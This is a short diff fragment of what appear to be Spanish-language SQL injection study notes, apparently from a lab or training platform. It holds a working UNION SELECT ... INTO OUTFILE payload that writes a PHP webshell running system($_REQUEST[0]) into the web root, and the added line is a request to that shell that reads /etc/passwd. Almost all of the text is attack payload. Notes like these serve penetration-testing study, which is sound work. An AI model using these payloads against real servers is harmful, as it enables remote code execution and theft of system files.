@@ -93,6 +93,7 @@ select 'file written successfully!' into outfile '/var/www/html/proof.txt'
 
 -- RCE: Escribir una Webshell PHP
 cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
+# http://STMIP:STMPO/shell.php?cmd=cat%20../etc/passwd
 ```
 
 ***
